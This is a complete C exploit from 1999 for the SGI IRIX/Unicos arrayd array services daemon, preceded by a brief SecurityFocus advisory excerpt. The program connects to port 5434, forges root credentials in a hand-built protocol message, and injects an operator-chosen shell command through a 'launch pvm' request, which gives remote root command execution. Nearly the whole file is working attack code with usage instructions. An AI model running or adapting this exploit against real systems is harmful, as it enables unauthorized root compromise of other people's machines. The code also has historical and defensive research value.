/*
source: http://www.securityfocus.com/bid/530/info

The SGI Array Services provide a mechanism to simplify administering and managing an array of clustered systems. The arrayd(1m) program is part of the array_services(5) and is known as the array services daemon. The default configuration for authorization makes clustered systems vulnerable to remote root compromises. The array services are installed on Irix systems by default from the Irix applications CD. All versions of Unicos post 9.0.0 are vulnerable. 
*/

/*## copyright LAST STAGE OF DELIRIUM aug 1999 poland        *://lsd-pl.net/ #*/
/*## arrayd                                                                  #*/

/*   this code makes the same as the following command invoked with root user */
/*   privileges:                                                              */
/*   /usr/sbin/array -s address launch pvm xxx xxx xxx "\";command;exit\""    */
/*   there are two possible authentication methods that can be used by        */
/*   the arrayd service:                                                      */
/*   AUTHENTICATION NONE                                                      */
/*       requests from anywhere are accepted                                  */
/*   AUTHENTICATION SIMPLE                                                    */
/*       requests from trusted hosts are accepted if they match the host/key  */
/*       from arrayd.auth file. if there is not a specific host/key pair for  */
/*       a given machine the request is also accepted although it should not  */
/*       be (see manual pages in case you dont believe it).                   */
/*       as you see, SGI suggestion to protect arrayd cluster by enabling     */
/*       simple authentication gives no result                                */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

char msg1[]={
    0x31,0x08,0x12,0x63,0x13,0x54,0x34,0x23,
    0x00,0x00,0x00,0x00,0x12,0x34,0x56,0x78,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x03,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

char msg2[]={
    0x00,0x00,0x00,0x02,0x10,0x00,0x28,0x00,
    0x00,0x00,0x00,0x0f,

    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,   /* array   */
    0x00,0x00,0x00,0x5c,0x12,0x34,0x56,0x78,   /* args    */
    0x00,0x00,0x00,0x24,0x00,0x00,0x00,0x38,   /* creds   */

    /* creds */
    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,   /* origin  */
    0x00,0x00,0x00,0x28,0x00,0x00,0x00,0x05,   /* user    */
    0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x05,   /* group   */
    0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,   /* project */
    0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,

    'r' ,'o' ,'o' ,'t' ,0x00,0x00,0x00,0x00,
    'r' ,'o' ,'o' ,'t' ,0x00,0x00,0x00,0x00,

    /* args */
    0x00,0x00,0x00,0x06,
    0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x30,

    0x00,0x00,0x00,0x3c,0x00,0x00,0x00,0x07,
    0x00,0x00,0x00,0x44,0x00,0x00,0x00,0x04,
    0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x04,
    0x00,0x00,0x00,0x4c,0x00,0x00,0x00,0x04,
    0x00,0x00,0x00,0x50,0x00,0x00,0x00,0x03,
    0x00,0x00,0x00,0x54,0x12,0x34,0x56,0x78,

    'l' ,'a' ,'u' ,'n' ,'c' ,'h' ,0x00,0x00,
    'p' ,'v' ,'m' ,0x00,'x' ,'x' ,'x' ,0x00,
    'x' ,'x' ,'x' ,0x00,'x' ,'x' ,'x' ,0x00,
};

main(int argc,char **argv){
    char buffer[10000],len[4],*b,*cmd="id";
    int i,c,sck;
    struct sockaddr_in address;
    struct hostent *hp;

    printf("copyright LAST STAGE OF DELIRIUM aug 1999 poland  //lsd-pl.net/\n");
    printf("arrayd for irix 6.2 6.3 6.4 6.5 6.5.4 IP:all\n\n");

    if(argc<2){
        printf("usage: %s address [-c command]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"c:"))!=-1){
        switch(c){
        case 'c': cmd=optarg;break;
        }
    }

    sck=socket(AF_INET,SOCK_STREAM,0);
    bzero(&address,sizeof(address));

    address.sin_family=AF_INET;
    address.sin_port=htons(5434);
    if((address.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
    }
    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }

    memcpy(buffer,msg2,sizeof(msg2));
    sprintf(&buffer[sizeof(msg2)],"\";%s;exit\"",cmd);

    *(unsigned long*)len=htonl(sizeof(msg2)+strlen(cmd)+8+1);
    b=&msg1[12];
    for(i=0;i<4;i++) *b++=len[i];

    write(sck,msg1,64);
    write(sck,buffer,sizeof(msg2)+strlen(cmd)+8+1);

    read(sck,buffer,64);
    read(sck,buffer,sizeof(buffer));

    b=&buffer[8];
    if((*(unsigned long*)b)!=1){
        printf("error: command refused\n");exit(-1);
    }
    b=&buffer[12];
    if(((*(unsigned long*)b)!=1)&&((*(unsigned long*)b)!=2)){
        printf("error: command not executed\n");exit(-1);
    }
    printf("OK!\n");
}

